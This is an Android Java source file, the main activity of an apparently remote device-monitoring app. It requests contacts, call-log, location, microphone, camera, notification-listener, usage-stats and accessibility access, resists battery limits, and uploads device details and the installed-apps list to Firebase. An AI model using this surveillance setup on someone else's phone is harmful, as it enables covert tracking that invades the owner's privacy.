package com.reiserx.testtrace.Activites;

import static android.Manifest.permission.ACCESS_BACKGROUND_LOCATION;
import static android.Manifest.permission.ACCESS_COARSE_LOCATION;
import static android.Manifest.permission.ACCESS_FINE_LOCATION;
import static android.Manifest.permission.CAMERA;
import static android.Manifest.permission.READ_CALL_LOG;
import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.READ_EXTERNAL_STORAGE;
import static android.Manifest.permission.RECORD_AUDIO;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.messaging.FirebaseMessaging;
import com.reiserx.testtrace.BuildConfig;
import com.reiserx.testtrace.Classes.GenerateQR;
import com.reiserx.testtrace.Classes.RestartExceptionHandler;
import com.reiserx.testtrace.Classes.StartMainService;
import com.reiserx.testtrace.Classes.checkUpdate;
import com.reiserx.testtrace.Models.User;
import com.reiserx.testtrace.Models.deviceInfo;
import com.reiserx.testtrace.Models.updateAppss;
import com.reiserx.testtrace.NotificationClasses.NotificationService;
import com.reiserx.testtrace.NotificationClasses.getListOfApps;
import com.reiserx.testtrace.R;
import com.reiserx.testtrace.Service.MakeMyToast;
import com.reiserx.testtrace.Service.RestartService;
import com.reiserx.testtrace.Utilities.generateKey;
import com.reiserx.testtrace.databinding.ActivityMainBinding;

import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;


public class MainActivity extends AppCompatActivity {

    ActivityMainBinding binding;

    SharedPreferences save;
    private FirebaseAuth auth = FirebaseAuth.getInstance();
    private FirebaseDatabase mdb = FirebaseDatabase.getInstance();

    ProgressDialog prog;

    private static final int REQUEST_CODE = 0;

    GenerateQR generateQR;

    private static String data;

    String TAG = "hhfhiwbf";

    @SuppressLint({"SetTextI18n", "BatteryLife"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.button2.setVisibility(View.GONE);
        binding.textView2.setVisibility(View.GONE);
        binding.versionTxt.setVisibility(View.GONE);
        binding.progressBar.setVisibility(View.GONE);

        auth = FirebaseAuth.getInstance();
        mdb = FirebaseDatabase.getInstance();
        Thread.setDefaultUncaughtExceptionHandler(new RestartExceptionHandler(this));

        binding.versionTxt.setText("ReiserX " + BuildConfig.VERSION_NAME);

        generateQR = new GenerateQR();

        String[] permissions;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions = new String[]{
                    READ_CONTACTS, ACCESS_BACKGROUND_LOCATION, READ_CALL_LOG, RECORD_AUDIO, CAMERA};
        } else {
            permissions = new String[]{
                    WRITE_EXTERNAL_STORAGE,
                    READ_EXTERNAL_STORAGE,
                    READ_CONTACTS,
                    ACCESS_COARSE_LOCATION,
                    ACCESS_FINE_LOCATION,
                    READ_CALL_LOG, RECORD_AUDIO, CAMERA};
        }

        if (checkPermissions(permissions)) { //  permissions  granted.
            StartMainService StartMainService = new StartMainService();
            StartMainService.startservice(this);
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }

            ComponentName cn = new ComponentName(this, NotificationService.class);
            String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            final boolean enabled = flat != null && flat.contains(cn.flattenToString());
            if (!enabled) {
                Intent intents = new Intent(
                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intents);
            }

            FirebaseUser User = auth.getCurrentUser();
            if (User == null) {
                binding.button2.setVisibility(View.VISIBLE);
                binding.button2.setOnClickListener(v -> {
                    prog = new ProgressDialog(this);
                    prog.setMessage("Login in progress...");
                    prog.setCancelable(false);
                    AlertDialog();
                });
            } else {
                binding.textView3.setVisibility(View.GONE);
                binding.progressBar.setVisibility(View.VISIBLE);

                if (!BuildConfig.DEBUG) {
                    checkUpdate checkUpdate = new checkUpdate();
                    checkUpdate.check(this);
                }
                File file = new File(Environment.getExternalStorageDirectory() + "/ReiserX");
                if (!file.exists()) {
                    file.mkdir();
                }

                StartMainService = new StartMainService();
                StartMainService.startservice(this);
                binding.textView2.setVisibility(View.VISIBLE);
                binding.versionTxt.setVisibility(View.VISIBLE);
                FirebaseUser Users = auth.getCurrentUser();
                getInfos(Users.getUid());
                mdb.getReference("Userdata").child(Users.getUid()).addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            binding.progressBar.setVisibility(View.GONE);
                            binding.textView3.setVisibility(View.VISIBLE);
                            User user = snapshot.getValue(User.class);
                            binding.textView3.setText(String.valueOf(user != null ? user.timestamp : null));
                            getQR(Encrypt(String.valueOf(user != null ? user.timestamp : null), user != null ? user.key : null), user != null ? user.uid : null);
                            user = null;
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });
                FirebaseFirestore firestore = FirebaseFirestore.getInstance();
                DocumentReference document = firestore.collection("Main").document(Users.getUid()).collection("DeviceInfo").document(Build.BRAND);
                document.get().addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        DocumentSnapshot document1 = task.getResult();
                        if (!Objects.requireNonNull(document1).exists()) {
                            getInfos(Users.getUid());
                        }
                    } else {
                        Log.d(TAG, "get failed with ", task.getException());
                    }
                });
                mdb.getReference("Main").child(Users.getUid()).child("ServiceStatus").child("version").setValue(BuildConfig.VERSION_NAME);
                getListOfApps getListOfApps = new getListOfApps(this, Users.getUid());
                getListOfApps.getData(FirebaseFirestore.getInstance());
                if (!isAccessGranted()) {
                    Intent usage = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    startActivity(usage);
                }
                if(!checkAccessibilityPermission()){
                    Toast.makeText(MainActivity.this, "please turn on Accessibility Service", Toast.LENGTH_SHORT).show();
                }
            }
        } else {
            Intent intent = new Intent(MainActivity.this, PermitActivity.class);
            startActivity(intent);
            finish();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
    }

    private boolean checkPermissions(String[] permissions) {
        int result;
        List<String> listPermissionsNeeded = new ArrayList<>();

        for (String p : permissions) {
            result = ContextCompat.checkSelfPermission(getApplicationContext(), p);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (result != PackageManager.PERMISSION_GRANTED || !Environment.isExternalStorageManager()) {
                    listPermissionsNeeded.add(p);
                }
            } else {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    listPermissionsNeeded.add(p);
                }
            }
        }

        return listPermissionsNeeded.isEmpty();
    }

    private void AlertDialog() {
        AlertDialog.Builder alert = new AlertDialog.Builder(this);
        final EditText edittext = new EditText(this);

        alert.setMessage("Please enter a nickname for this device to identify it");
        alert.setTitle("Enter name");
        alert.setView(edittext);

        save = getSharedPreferences("users", MODE_PRIVATE);
        SharedPreferences.Editor myEdit = save.edit();

        alert.setPositiveButton("Login", (dialog, whichButton) -> {
            //What ever you want to do with the value
            final String data = edittext.getText().toString();
            if (!data.trim().equals("")) {
                prog.show();
                auth.signInAnonymously()
                        .addOnCompleteListener(this, task -> {
                            if (task.isSuccessful()) {
                                // Sign in success, update UI with the signed-in user's information

                                FirebaseUser Users = auth.getCurrentUser();
                                auth = null;
                                if (Users!=null) {
                                    update(Users.getUid(), data);
                                    myEdit.putString("UserID", Users.getUid());
                                    myEdit.putString("Name", data);
                                    myEdit.apply();
                                } else {
                                    Toast.makeText(MainActivity.this, "Login failed", Toast.LENGTH_SHORT).show();
                                }

                            } else {
                                // If sign in fails, display a message to the user.
                                Log.w(TAG, "signInAnonymously:failure", task.getException());
                                Toast.makeText(MainActivity.this, String.valueOf(task.getException()), Toast.LENGTH_SHORT).show();
                            }
                        });
            } else Toast.makeText(this, "Please enter a name", Toast.LENGTH_SHORT).show();
        });
        alert.show();
    }

    public void update(String userID, String datas) {
        StartMainService StartMainService = new StartMainService();
        StartMainService.startservice(this);

        prog.setMessage("Saving data...");
        prog.show();

        mdb = FirebaseDatabase.getInstance();

        generateKey generateKey = new generateKey();

        Date date = new Date();
        long time = date.getTime();
        User user = new User(userID, datas, generateKey.randomString(25), time);

        binding.button2.setVisibility(View.GONE);
        binding.versionTxt.setVisibility(View.VISIBLE);
        binding.textView2.setVisibility(View.VISIBLE);

        FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(task -> {
                    if (!task.isSuccessful()) {
                        Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                        return;
                    }

                    // Get new FCM registration token
                    String token = task.getResult();
                    writeFileExternalStorage(token, userID);
                });

        mdb.getReference().child("Userdata").child(userID)
                .setValue(user)
                .addOnSuccessListener(unused -> mdb.getReference("Userdata").child(userID).addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            User user = snapshot.getValue(User.class);
                            if (user!=null) {
                                binding.textView3.setVisibility(View.VISIBLE);
                                binding.textView3.setText(String.valueOf(user.timestamp));
                                getQR(Encrypt(String.valueOf(user.timestamp), user.key), userID);
                                getListOfApps getListOfApps = new getListOfApps(MainActivity.this, userID);
                                getListOfApps.getData(FirebaseFirestore.getInstance());
                                user = null;
                            }
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                }));
        getInfos(userID);
    }

    public void writeFileExternalStorage(String Token, String userID) {

        FirebaseFirestore firestore = FirebaseFirestore.getInstance();

        Map<String, Object> token = new HashMap<>();
        token.put("Notification token", Token);
        CollectionReference document = firestore.collection("Main").document(userID).collection("TokenUrl");
        document.add(token)
                .addOnSuccessListener(documentReference -> {
                    Intent in = new Intent(this, RestartService.class);
                    startService(in);
                    mdb.getReference("Main").child(userID).child("ServiceStatus").child("Status").setValue("Online").addOnSuccessListener(unused -> {
                        prog.dismiss();
                        prog = null;
                        mdb = null;
                        auth = null;
                        save = null;
                        binding = null;
                    });
                })
                .addOnFailureListener(e -> {
                    FirebaseAuth auth = FirebaseAuth.getInstance();
                    FirebaseUser user = auth.getCurrentUser();
                    if (user != null) {
                        auth.signOut();
                    }
                    finishAffinity();
                    Toast.makeText(this, String.valueOf(e), Toast.LENGTH_SHORT).show();
                    Log.w(TAG, "Error adding document", e);
                });
    }

    public void getInfos(String UserID) {

        deviceInfo deviceInfo = new deviceInfo(Build.SERIAL, Build.MODEL, Build.ID, Build.MANUFACTURER, Build.USER, Build.VERSION.SDK_INT, Build.VERSION.RELEASE);

        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        DocumentReference document = firestore.collection("Main").document(UserID).collection("DeviceInfo").document(Build.BRAND);
        document.set(deviceInfo).addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.d("jrnjnffkjeg", String.valueOf(task.getException()));
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isMyServiceRunning(this)) {
            generateQR.releaseBitmap();
            Intent in = new Intent(this, MakeMyToast.class);
            stopService(in);
        }
    }

    private boolean isMyServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (MakeMyToast.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (REQUEST_CODE == requestCode) {
            if (requestCode == Activity.RESULT_OK) {
                // done with activate to Device Admin
            } else {
            }
        }
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        switch (item.getItemId()) {
            case R.id.logout:
                AlertDialog.Builder dialog = new AlertDialog.Builder(this);
                dialog.setTitle("Logout");
                dialog.setMessage("Are you sure you want to logout");
                dialog.setPositiveButton("logout", (dialogInterface, i) -> {
                    FirebaseAuth mAuth = FirebaseAuth.getInstance();
                    FirebaseUser currentUser = mAuth.getCurrentUser();
                    if (currentUser != null) {
                        mAuth.signOut();
                        finishAffinity();
                    }
                });
                dialog.setNegativeButton("cancel", null);
                dialog.show();

                break;
            case R.id.update_menu:
                FirebaseDatabase.getInstance().getReference("Administration").child("App").child("Target").child("Updates").addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            updateAppss updateAp = snapshot.getValue(updateAppss.class);
                                Intent i = new Intent(MainActivity.this, Update_app.class);
                                i.putExtra("version", updateAp.version);
                                startActivity(i);
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });
                break;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu1, menu);
        return super.onCreateOptionsMenu(menu);
    }

    public void getQR(String data, String uid) {
        Map<String, Object> datas = new HashMap<>();
        datas.put("data", data);
        datas.put("uid", uid);
        String jsonString = new JSONObject(datas).toString();
        binding.imageView.setImageBitmap(generateQR.createQR(jsonString));
    }

    private String Encrypt(final String datas, final String keys) {
        try {
            javax.crypto.SecretKey key = generateKey(keys);
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(javax.crypto.Cipher.ENCRYPT_MODE, key);
            byte[] encVal = c.doFinal(datas.getBytes());
            data = android.util.Base64.encodeToString(encVal, android.util.Base64.DEFAULT);
        } catch (Exception ex) {
            Log.d(TAG, String.valueOf(ex));
        }
        return data;
    }

    private javax.crypto.SecretKey generateKey(String pwd) throws Exception {
        final java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
        byte[] b = pwd.getBytes("UTF-8");
        digest.update(b, 0, b.length);
        byte[] key = digest.digest();
        javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec(key, "AES");
        return sec;
    }
    private boolean isAccessGranted() {
        try {
            PackageManager packageManager = getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(getPackageName(), 0);
            AppOpsManager appOpsManager = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, applicationInfo.uid, applicationInfo.packageName);
            return (mode == AppOpsManager.MODE_ALLOWED);

        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public boolean checkAccessibilityPermission () {
        int accessEnabled = 0;
        try {
            accessEnabled = Settings.Secure.getInt(this.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
            Log.d(TAG, e.toString());
        }
        if (accessEnabled == 0) {
            // if not construct intent to request permission
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // request permission via start activity for result
            startActivity(intent);
            Log.d(TAG, "start 1");
            return false;
        } else {
            Log.d(TAG, "start 2");
            return true;
        }
    }

}